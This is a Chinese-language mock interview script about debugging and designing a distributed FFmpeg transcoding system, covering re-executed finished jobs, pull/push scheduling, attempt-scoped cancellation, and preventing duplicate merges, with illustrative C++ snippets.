**面试官：** 你说做过故障恢复，能讲一个真实的 bug 吗？

**我：** 讲一个我印象最深的——**一个「已完成的任务被重新执行」的 bug**，而且它的成因是「两个本来正确的机制组合出了错误」。

**面试官：** 什么现象？

**我：** 任务是 SUCCESS 状态、合并产物也产出了。然后**过一会儿，日志里出现了这个任务的 shard 被重新分配、重新转码的记录**。

**注意这不是「结果错了」——是「白干了一遍活」**。任务状态是对的（还是 SUCCESS），但**多烧了 CPU、多产出了一些会被丢弃的文件**。

**面试官：** 那你是怎么定位的？

**我：** 我追踪了「谁在重新分配 shard」。日志显示是 `NotifyWorkerOffline` 触发的——也就是「有 Worker 心跳超时，Scheduler 把它手上的 shard 重置为 WAITING」。

**关键问题来了**：**为什么这个 Worker 手上还有已完成任务（SUCCESS）的 shard？**

**答案是**：任务已经 SUCCESS 了，但 **shard 记录里还残留着 `assigned_worker_id`**——因为「任务完成后，没有人去清理 shard 的分配信息」。

**面试官：** 那为什么 `NotifyWorkerOffline` 会去动这些 shard？

**我：** 看当时的代码逻辑：

```cpp
// 拿该 worker 上的所有 shard
auto shards = ShardStore::GetInstance().ListByWorker(worker_id);
for (const auto& s : shards)
{
    // 重新读，快照副本
    auto fresh_opt = ShardStore::GetInstance().Get(s.shard_id);
    if (!fresh_opt.has_value()) continue;
    auto shard = fresh_opt.value();

    if (shard.retry_count >= shard.max_retry) { /* → FAILED */ }
    else
    {
        shard.retry_count++;
        shard.status = WAITING;                    // ← 重置！
        ShardStore::GetInstance().UpdateIfStatus(s.shard_id, {s_assigned, s_running}, shard);
        NotifyShardWaiting(s.shard_id);
    }
}
```

**它只检查了「shard 的 retry_count 够不够」**，**没有检查「这个 shard 是不是已经是终态」、更没有检查「它所属的 job 是不是已经终态」**。

**所以一个已经 SUCCESS 的残留 shard，只要 `retry_count < max_retry`，就会被重置成 WAITING，然后被重新分配。**

**面试官：** 那根本问题是什么？

**我：** **根本问题是「ResultCollector 判定 job 终态后，Scheduler 不知道」。**

数据流是这样的：

```text
Worker → 上报结果 → ResultCollector
                        │
                        ├─ 判定全部 SUCCESS → job.status = SUCCESS
                        │   （只通知了 JobService）
                        │
                        └─ ✗ 没有告诉 Scheduler「这个任务结束了」
```

**Scheduler 完全不知道 job 已经完成**——它只看到「shard 表里有几条 ASSIGNED/RUNNING 的记录」，于是在 Worker 离线时**尽职尽责地**把它们重置了。

**所以这不是「Scheduler 的 bug」，也不是「RC 的 bug」**——而是**两个服务之间缺少一个通知**。

**面试官：** 那你怎么修的？

**我：** 三层修复。

**第一层：终态时通知 Scheduler。**

`MarkJobTerminal` 在判定终态后，**主动通知 Scheduler**：

```cpp
// 复用 CancelJobShards，reason = JOB_TERMINAL
SchedulerService_Stub::CancelJobShards(job_id, "JOB_TERMINAL");
```

**复用 `CancelJobShards`**——因为它做的事情正好是我们需要的：「告诉 Scheduler 别再管这个 job 的 shard 了」。

**第二层：`CancelJobShards` 先把本地非终态 shard 标 CANCELED，再通知 Worker。**

顺序很重要——**先落本地状态**（保证 Scheduler 自己不会再分配），**再通知 Worker**（best-effort 停执行）。

**第三层（最关键）：所有「可能重置 shard」的地方，都加 job 终态检查。**

**为什么这层最关键**——因为**第一层是 best-effort 的**（RPC 可能失败），必须有兜底。

我加了一个 helper：

```cpp
// 若 job 已终态，把 shard 标记为 CANCELED（终态任务的残留执行不得被重新分配/重调度）。
static bool MarkShardCanceledIfJobTerminal(const std::string& shard_id,
                                           const std::string& job_id,
                                           ShardRecord& shard)
{
    auto j_opt = JobStore::GetInstance().Get(job_id);
    if (!j_opt.has_value()) return false;
    // 看看 job 有没有进入终态
    if (!IsJobTerminal(j_opt->status)) return false;

    // 进入终态，代表 Job 结束，分配已经完成，重置该分片，设置状态
    int from_status = shard.status;
    shard.status = static_cast<int32_t>(ShardStatus::SHARD_CANCELED);
    shard.assigned_worker_id.clear();
    shard.attempt_id.clear();
    shard.updated_at = NowMs();
    ShardStore::GetInstance().UpdateIfStatus(shard_id, {from_status}, shard);
    return true;
}
```

**这个 helper 有 4 个调用点**：

| 调用点 | 场景 |
|---|---|
| `NotifyWorkerOffline` | Worker 离线时重置 shard 前 |
| `TryAssignShard` | 分配前（双重路径保护） |
| SchedulingLoop ASSIGNED 重扫 | 超时重扫时 |
| SchedulingLoop RUNNING 重扫 | 超时重扫时 |

**面试官：** 那如果通知丢了会怎样？

**我：** **第一层（通知）丢了，第三层（终态检查）兜住。**

这是我有意设计的**双保险**：

```text
快路径：MarkJobTerminal → CancelJobShards → Scheduler 立刻知道
兜底路径：Scheduler 在处理任何 shard 前，都查一次 job 是否终态
```

**即使 `CancelJobShards` 的 RPC 完全失败**（打 WARN），Scheduler 在处理那些残留 shard 时，也会通过 `MarkShardCanceledIfJobTerminal` 发现「job 已经终态了」，然后**标 CANCELED 而不是重置**。

**这就是「跨服务通知是快路径、终态检查是兜底」的分层**。

**面试官：** 这个 bug 给你什么启发？

**我：** 三点。

**第一，两个「各自正确」的机制组合起来可能是错的。** `NotifyWorkerOffline` 的逻辑没错（Worker 挂了就该重置它的 shard），`MarkJobTerminal` 的逻辑也没错（任务完成就该判终态）。**但它们之间缺了一个同步**——结果就是「任务已完成」这个事实**没有传播到需要它的地方**。

**第二，「谁需要知道什么」应该被显式设计。** 这个 bug 的本质是**信息流不完整**。修复之后我专门梳理了「哪些状态变化需要通知哪些服务」，而不是「遇到问题再加一个通知」。

**第三，best-effort 的通知必须有兜底。** 任何跨服务的通知都可能失败（网络、对方重启、超时）。**如果这个通知关系到正确性，就必须有一个不依赖它的兜底路径。** 我的兜底就是「在使用数据前再检查一次它的前提条件」。

### 剧本②：调度模式从 Pull 到 Push 再到双模

**面试官：** 你的调度是怎么做的？

**我：** 经历了三代演进：**Pull → Push → 双模并存**。

**第一代：Pull 轮询（2 秒）。**

```cpp
constexpr int64_t kScheduleIntervalMs = 2000;
while (!stop_flag)
{
    std::this_thread::sleep_for(std::chrono::milliseconds(interval_ms));
    auto waiting_shards = ShardStore::GetInstance().ListByStatus(SHARD_WAITING);
    // ... 分配
}
```

**简单、可靠**。但延迟被轮询周期钳制——**平均 ~1 秒，最坏 2 秒**。

**面试官：** 2 秒的延迟有问题吗？

**我：** 对于「提交任务后等结果」这个体验来说**是可感知的**。整个转码流程可能只要 10 秒，其中 2 秒花在「等轮询」上——**20% 的时间在空转**。

而且这个延迟**浪费在最不应该的地方**：任务提交是一个**明显的用户操作**，用户按了提交之后看着屏幕等——这 2 秒是**纯粹的用户体验损失**。

**第二代：Push 事件驱动。**

**思路**：**在每一个「shard 变成 WAITING」的地方发一条 MQ 事件**，Scheduler 有独立的消费线程，收到就立刻分配。

```cpp
static void NotifyShardWaiting(const std::string& shard_id)
{
    auto& mq = MqClient::GetInstance();
    if (!mq.inited() || !mq.enabled()) return;
    if (!mq.PublishShardWaiting(shard_id))
    {
        LOG_WARN("NotifyShardWaiting: publish %s failed, fallback to "
                 "SchedulingLoop polling", shard_id.c_str());
    }
}
```

**实测延迟从 ~1 秒降到 33 毫秒**（【记录】）。

**面试官：** 那为什么还要保留轮询？

**我：** **因为 Push 替代不了轮询承担的一部分职责。**

**我列一下轮询在做什么**：

| 轮询的职责 | Push 能替代吗 |
|---|---|
| 分配新创建的 shard | ✅（Push 的主场景） |
| 分配重试的 shard | ✅ |
| 分配 Worker 离线后重置的 shard | ✅ |
| **超时重扫**（找出卡死的 shard） | ❌ **没有人会通知「我卡住了」** |
| **启动恢复**（Scheduler 崩溃重启后扫残留） | ❌ 同理 |
| **消息丢失时的兜底** | ❌ 正好是 Push 失效的场景 |

**「超时重扫」和「启动恢复」本质上是「扫描全表找异常」**——**异常不会自己发通知**。

**而且还有一个更根本的理由**：**Push 引入了一个新的故障面**。

如果只有 Push，那么：
- MQ 挂了 → **所有 shard 都分配不出去**；
- 消息发布失败（网络抖动）→ 那个 shard **永远卡在 WAITING**；
- 消息被消费了但处理失败 → 同理。

**「分配完全停掉」的后果比「延迟 2 秒」严重得多。**

**所以第三代是「双模并存」**：

```cpp
bool mq_active = mq.inited() && mq.enabled() && mq.connected();
interval_ms = mq_active ? kScheduleIntervalMsIdle     // 5000ms
                        : kScheduleIntervalMs;        // 2000ms
```

**MQ 在线时轮询降频到 5 秒（只做兜底），掉线时恢复到 2 秒（承担主要职责）。**

**面试官：** 那这个「降频」是怎么切换的？

**我：** **没有切换——因为轮询一直在跑，只是频率不同。**

这是我比较满意的一个设计点。**另一种做法是「检测到 MQ 故障就启用轮询」**：

```cpp
// 反面设计
if (mq_failed) { enable_polling(); }
else { disable_polling(); }
```

**但这种做法有三个问题**：

1. **需要故障检测逻辑**——而「检测故障」本身就可能出错（误判、漏判）；
2. **切换有中间态**——切换的瞬间可能丢事件或者重复处理；
3. **恢复需要显式动作**——MQ 恢复了怎么切回去？又要一套检测。

**而我的做法根本没有「切换」这个动作**：

```text
MQ 在线：轮询 5 秒一次（慢，因为快路径在 MQ）
MQ 掉线：轮询 2 秒一次（快，因为它是唯一的路径）
```

**`mq.connected()` 只是一个「查当前状态」的判断，不是一个「切换动作」。** 每一轮都重新判断，所以：

- **MQ 恢复后，下一轮自动用回 5 秒频率**——不需要任何「切回」逻辑；
- **没有中间态**——任何时刻轮询都在工作，只是快慢不同。

**这个模式的通用名字叫「按次降级」**（相对于「熔断」）。它在 `LoadOnlineWorkers` 里也用了（Redis 快照 vs ListWorkers RPC 每次重新判断）。

**面试官：** 还有什么细节是你觉得设计得好的？

**我：** 有一个**很容易写错的地方**——**超时重扫必须「按时间」而不是「按轮次」**。

我最初写的是「每 15 轮做一次超时重扫」：

```cpp
// 反例
if (round_count % 15 == 0) { do_timeout_rescan(); }
```

**看起来没问题**——直到我意识到**循环间隔本身在变**：

```text
MQ 在线（5 秒/轮）：15 × 5 = 75 秒       ← 超时重扫变成 75 秒一次
MQ 掉线（2 秒/轮）：15 × 2 = 30 秒
```

**重扫周期会随 MQ 状态漂移**。而且如果将来调整了循环间隔，**重扫周期会静默变化**——这种 bug 很难发现，因为它不报错，只是「重扫比预期晚」。

**改成按时间之后**：

```cpp
constexpr int64_t kTimeoutRescanIntervalMs = 30000;   // 按时间，与间隔解耦
...
if (now_ms - last_rescan_ms >= kTimeoutRescanIntervalMs)
{
    last_rescan_ms = now_ms;
    ...
}
```

**不管循环多久跑一轮，重扫固定 30 秒一次。**

**这个原则可以推广**：**任何「周期性任务」的周期，都应该用「时间」表达，而不是「轮次」。** 因为「轮次」的时长是不确定的——它取决于循环体的执行时间。

### 剧本③：Run 下的取消链路——强保证 + best-effort

**面试官：** 你的取消功能可靠吗？

**我：** **分两层看：「状态取消」是强保证，「停止执行」是 best-effort。** 这是个刻意的设计。

**面试官：** 展开说说。

**我：** 先说**强保证的那层**。

用户调 `CancelJob` 时，做的事情是**两条数据库操作**：

```cpp
// 1. 条件推进 job → CANCELED
JobStore::GetInstance().UpdateIfStatus(job_id, {from_status}, job);

// 2. 把所有非终态 shard 标记为 CANCELED
for (auto& s : shards)
{
    if (st == SHARD_SUCCESS || st == SHARD_FAILED || st == SHARD_CANCELED) continue;
    int from_status = st;
    s.status = s_canceled;
    ShardStore::GetInstance().UpdateIfStatus(s.shard_id, {from_status}, s);
}
```

**这一步一旦成功，就产生了三个「永不」**：

1. **这些 shard 永远不会再被调度**——因为 `SchedulingLoop` 只扫 `WAITING`，而它们已经是 `CANCELED`；
2. **永远不会被重试**——重试的触发是「收到失败结果后调 `RescheduleShard`」，而那个路径也有终态检查；
3. **永远不会被合并产出成品**——`CheckJobDone` 的判定基于 shard 状态，CANCELED 不算 SUCCESS。

**所以「取消」这个语义是**：**这个任务的结果永远不会被交付**。

**面试官：** 那 best-effort 的那层呢？

**我：** 是**停掉正在跑的 FFmpeg 进程**。

```cpp
// 委托 Scheduler 向 Worker 传播
SchedulerService_Stub::CancelJobShards(job_id, reason);   // 超时 5 秒
```

**这个 RPC 的语义明确是 best-effort**（`scheduler.proto:70` 的注释）：

```proto
// 本 RPC 永远返回 error_code=0 —— 调用方不应将 worker 通知失败视为 CancelJob 失败
```

**为什么它必须是 best-effort**：

**因为「停掉一个正在运行的进程」本质上做不到 100% 可靠**：
- Worker 可能已经崩了；
- 网络可能不通；
- Worker 可能正在 fork 子进程的中间态；
- `kill` 信号可能被忽略（虽然 FFmpeg 不会）。

**如果要求「取消必须停掉执行」，取消就变成了一个跨多个服务的分布式事务**——需要重试、需要补偿、需要处理各种部分失败。**复杂度提高一个量级，而收益是什么？**

**收益是「少烧一点 CPU」。** 而已启动的转码即使跑完，**产出也会被丢弃**——因为状态已经 CANCELED 了。

**所以这是个成本收益判断**：

| 方案 | 复杂度 | 收益 |
|---|---|---|
| **状态强保证 + 执行 best-effort（我的选择）** | 低（两条 UPDATE） | 结果永不交付（核心语义保证） |
| 取消要做到执行级强保证 | **高**（分布式事务） | 少烧一点 CPU |

**我选了前者。** 最坏情况就是：**已经启动的转码跑完、产出被丢弃**。

**面试官：** 那执行层是怎么做到「尽快停」的？

**我：** 从「用户点取消」到「FFmpeg 被 kill」，中间有几个环节，每个都做了优化。

**① `CancelShard` 只置标志，不直接 kill。**

```cpp
running_shard->cancelled = true;      // std::atomic<bool>，仅此而已
```

**为什么不直接 kill**——三个理由：

**第一，线程安全**。FFmpeg 子进程**由执行线程创建并 `waitpid` 回收**。如果 `CancelShard` 的 handler（跑在 RPC 的 work 线程）直接 `kill(pid)`，就和执行线程的 `waitpid` **构成了竞态**：

```text
work 线程：读到 pid = 12345
执行线程：waitpid(12345) 回收了子进程
work 线程：kill(12345)     ← 这个 pid 可能已经被系统分配给别的进程了！
```

**这就是经典的「pid 复用误杀」**。用一个原子标志把「通知」和「执行 kill」解耦，**kill 永远由子进程的 owner（执行线程）做**。

**第二，优雅退出**。`SIGKILL` 打在文件写一半的时候，会留下**损坏的中间产物**。而 `SIGTERM` 让 FFmpeg 有机会**写完文件尾部（moov atom）、关闭编码器、清理临时文件**。

**第三，解耦**。`CancelShard` 不需要知道「pid 是多少」「进程还在不在」——它只需要「表达取消意图」。

**② 执行线程有「双检测点」，保证及时响应。**

```cpp
// 检测点 1：poll 超时（子进程安静时，最多 1 秒延迟）
if (ret == 0)
{
    if (should_cancel && should_cancel())
    {
        LOG_INFO("ExecuteCommand: cancel requested, sending SIGTERM to pid=%d", pid);
        kill(pid, SIGTERM);
        killed = true;
    }
    if (killed) break;
    continue;
}
...
// 检测点 2：每行进度输出后（有输出时近乎即时）
if (should_cancel && should_cancel())
{
    LOG_INFO("ExecuteCommand: cancel requested (inline check), sending SIGTERM to pid=%d", pid);
    kill(pid, SIGTERM);
    killed = true;
    break;
}
```

**为什么需要两个检测点**——因为 FFmpeg 有两种工作状态：

- **安静时**（没有输出）：`poll` 会超时，**检测点 1 负责**（最多 1 秒延迟）；
- **活跃时**（每 ~0.5 秒输出一行进度）：`poll` 立即返回，**如果只在超时分支检测，就永远检测不到**——因为 `poll` 从不超时！

**检测点 2（每行输出后检查）**就是为这种情况准备的。**FFmpeg 的 `-progress` 每 ~0.5 秒一行，所以实际取消延迟约 0.5 秒**——用户感知上就是「立刻停了」。

**③ SIGTERM 后等 5 秒，再 SIGKILL 兜底。**

```cpp
if (killed)
{
    pid_t wr = waitpid(pid, &child_status, WNOHANG);
    for (int i = 0; i < 10 && wr == 0; ++i)      // 10 × 500ms = 5 秒
    {
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
        wr = waitpid(pid, &child_status, WNOHANG);
    }
    if (wr == 0)
    {
        LOG_WARN("ExecuteCommand: pid=%d did not exit after SIGTERM, sending SIGKILL", pid);
        kill(pid, SIGKILL);
        waitpid(pid, &child_status, 0);
    }
    child_reaped = true;
}
```

**5 秒的依据**：FFmpeg 收到 SIGTERM 后需要**写文件尾部（moov atom）、关闭编码器、清理临时文件**——这些操作需要时间。**5 秒是「够它写完，但不会无限等」**。

**面试官：** 你刚才说 `CancelShard` 要校验 attempt，这是为什么？

**我：** 这是个很精妙的设计——**同一个 `CancelShard` RPC，在不同的调用场景下，语义不同**。

**两种取消**：

| 场景 | 意图 | 带 attempt_id 吗 |
|---|---|---|
| **超时重扫**（系统发现卡死） | 取消**卡死的旧执行**，但**保留新执行** | ✅ **带** |
| **用户取消**（CancelJob） | job 都没了，**所有执行都该停** | ❌ **不带** |

**超时重扫为什么必须带 attempt_id**：

```text
[t0]  shard 分配给 Worker A（attempt_id = "shard_0_attempt_0"）
[t30] 超时，判定卡死 → 重置 WAITING → retry_count++ → 重新分配给 Worker B（attempt_1）
[t31] 如果这时候 C 也看这个 shard 超时了，发一个「不带 attempt_id」的取消
      → Worker B 收到 → 把 attempt_1 也杀了！
```

**新执行被误杀 → 它也会卡住 → 又超时 → 又重分配 → 又误杀……** **形成死循环式的浪费**。

**带上 attempt_id 之后**：

```cpp
// transcode_worker.cpp:212-227 CancelShard handler
if (!request->attempt_id().empty() && running_shard->attempt_id != request->attempt_id())
{
    // 不匹配，不是我要取消的那个执行
    response->set_error_code(...);
    return;
}
```

**Worker 会检查「你要取消的是不是我现在跑的这个 attempt」**——不是的话就拒绝。

**而用户取消不带 attempt_id**——因为 job 已经 CANCELED 了，**Worker B 的执行也应该停**（虽然它不会被交付结果，但没必要继续烧 CPU）。

**所以这句话是核心**：**`attempt_id` 是手段，意图是目的。**

### 剧本④：Merge 互斥集——mutex 管「同时」，set 管「先后」

**面试官：** 合并这块有什么坑？

**我：** 有两个，而且第二个让我意识到「加锁」和「防重复」是两件事。

**面试官：** 先说第一个。

**我：** 第一个是**并发写同一个文件导致的产物串片**。

**问题**：合并需要生成一个「文件列表」（concat demuxer 的输入），最初用的是**固定的文件名**：

```cpp
std::string filelist_path = output_dir + "/filelist.txt";     // ← 固定名
```

**如果两个 job 同时合并**：

```text
Job A：写 filelist.txt = "file 'a_0.mp4'\nfile 'a_1.mp4'\n"
Job B：写 filelist.txt = "file 'b_0.mp4'\nfile 'b_1.mp4'\n"     ← 覆盖
Job A：ffmpeg -f concat -i filelist.txt ... → 读到了 B 的文件列表
```

**结果**：Job A 的产物里混进了 Job B 的分片。

**这个 bug 特别难发现，因为产物看起来是正常的**——能播放、时长也对（因为 B 的分片也是 15 秒），**只是内容不对**。如果没有人工去看视频内容，测试是发现不了的。

**修复**：**从输出文件名派生唯一的 filelist 名**。

```cpp
// #11 修复：filelist 用含输出名的唯一文件（output 形如 {job_id}_merged.mp4，
// 派生名必然唯一），不再跨 job 共享固定名 filelist.txt——并发 merge 时
// concat 不再读到对方 job 的 file 条目导致产物串片。
std::string output_basename = output_path.substr(output_path.find_last_of('/') + 1);
std::string filelist_path = output_dir + "/." + output_basename + ".filelist.txt";
```

**关键洞察**：**输出文件名里已经包含了 `job_id`**（`{job_id}_merged.mp4`）——所以从它派生的名字**天然唯一**，不需要额外的 UUID。

**面试官：** 那第二个坑呢？

**我：** 第二个是**同一个 job 被合并两次**。

**问题**：即使 filelist 唯一了，**同一个 job 也不该被合并两次**。有两个并发来源：

1. **两个线程同时过 `CheckJobDone`** → 都判定 SUCCESS → 都触发 merge；
2. **`TerminalSweepLoop`（15 秒一轮）再次判定 SUCCESS** → 又 merge 一次。

**两个 merge 同时写同一个 `{job_id}_merged.mp4`**——因为 ffmpeg 命令里有 `-y`（覆盖），**两个进程会互相截断对方的输出**。

**我最初的想法是「加个锁」**：

```cpp
// 不完整的设计
static std::mutex merge_mutex;
std::lock_guard<std::mutex> lock(merge_mutex);
if (already_merged) return;
do_merge();
```

**但这个「已经合并过了」的判断怎么存？** 如果用局部变量，函数返回就没了。

**面试官：** 那正确的做法是什么？

**我：** 用 **`mutex` + `set` 两个东西**，因为它们管的是**不同的时间维度**：

```cpp
// Merge 互斥集：防止并发/重复 merge 毁掉成品视频
static std::mutex& MergeMutex() { static std::mutex m; return m; }
static std::unordered_set<std::string>& MergingJobs() { static std::unordered_set<std::string> s; return s; }
```

**关键理解**：

> **mutex 管「同一时刻」，set 管「跨越时刻」。**

**只用锁是不够的**——看这个时序：

```text
[00:00] 线程 A：拿锁 → 检查（无记录）→ 开始 merge
[00:00] 线程 A：merge 完成 → 放锁
[00:15] TerminalSweepLoop：拿锁 → 检查 —— 如果没有 set，这里会再 merge 一次！
```

**锁在 00:00 就释放了**——它保护不了「15 秒后再来一次」。**因为那是「先后」的问题，不是「同时」的问题。**

**`set` 是「跨轮次的持久记忆」**——它记录「这个 job 已经合并过了」，这个事实**不随时间消失**。

**面试官：** 那这个 set 什么时候清理？

**我：** **成功就永久保留，失败就撤销**——这个不对称是刻意的：

```cpp
if (status == JobStatus::JOB_SUCCESS)
{
    std::lock_guard<std::mutex> lock(MergeMutex());
    if (MergingJobs().count(job_id))
    {
        LOG_INFO("...: merge for job=%s already in progress or completed, skipping (fix #7)");
        goto skip_merge;
    }
    MergingJobs().insert(job_id);           // ← 先登记

    auto merge_result = FfmpegExecutor::Merge(merge_inputs, merged_output);
    if (merge_result.success)
    {
        LOG_INFO("...: merge SUCCESS for job=%s, output=%s (elapsed=%lldms)", ...);
        // 清理各 shard 中间文件
        for (const auto& path : merge_inputs)
            if (std::remove(path.c_str()) == 0) { ... }
        // ← 成功：不 erase，永久登记
    }
    else
    {
        MergingJobs().erase(job_id);         // ← 失败：撤销登记
        LOG_ERROR("...: merge FAILED for job=%s: %s (will retry via TerminalSweepLoop)", ...);
        return;                              // ← 不改终态
    }
}
```

**「成功永久登记」防的是「重复合并」**，「**失败撤销登记」保证「失败可以重试」**——**这个不对称形成了一个收敛闭环**：

- 成功 → 永远不会再合并 → 不会重复；
- 失败 → 下次还有机会 → 不会永久失败。

**面试官：** 那 merge 失败之后怎么重试？

**我：** 这里我要**诚实说明**——**文档里写的重试路径实际上是不通的**。

代码里的日志说：

```cpp
LOG_ERROR("...: merge FAILED for job=%s: %s (will retry via TerminalSweepLoop)", ...);
```

**但实际上**，`TerminalSweepLoop` 在开头就**跳过了终态 job**：

```cpp
// 只检查非终态 job（PENDING / SCHEDULING / RUNNING）
```

而 `MarkJobTerminal` **在进 merge 之前就把 job 写成了 SUCCESS**——所以这个 job **再也不会被 `TerminalSweepLoop` 扫到**。

**所以 merge 失败的实际重试路径是**：**后续还有 `ReportShardResult` 进来**（比如 MQ 重投、或者幂等分支的重复上报）——那两条幂等分支**都会调 `CheckJobDone`**，而 merge 块在「状态未推进时依然会执行」。

**这个路径是通的，但很间接**——**如果没有任何后续的结果上报，merge 就永远不会重试**。

**这是个已知的设计缺陷**，修复方向有两个：
1. **`TerminalSweepLoop` 不要跳过「SUCCESS 但产物不存在」的 job**；
2. **merge 失败时不把 job 置为 SUCCESS**（但那样又回到了「什么时候算成功」的问题）。

**我倾向于方案一**——因为它不改变「job 状态的含义」（任务成功就是所有 shard 都成功了），只是**增加一个「产物完整性」的检查**。

**面试官：** 这个 bug 给你什么启发？

**我：** **「加锁」和「防重复」是两件不同的事。**

**我最初的本能反应是「并发问题就加锁」**——但这次让我意识到：

| 问题 | 正确工具 |
|---|---|
| 「两个线程**同时**做同一件事」 | **锁** |
| 「同一件事被**先后**做了两次」 | **持久化的记录**（set / 状态标记 / 幂等键） |

**这个区分在很多场景下都成立**：
- 幂等（`attempt_id`）防的是「**先后**重复」——需要记录「已经处理过哪个代次」；
- 分布式锁防的是「**同时**竞争」——只需要一个短暂的互斥。

**两者常常需要同时存在**——就像我的 merge 一样：**锁保证同一时刻只有一个在跑，set 保证跨时刻不会重复**。
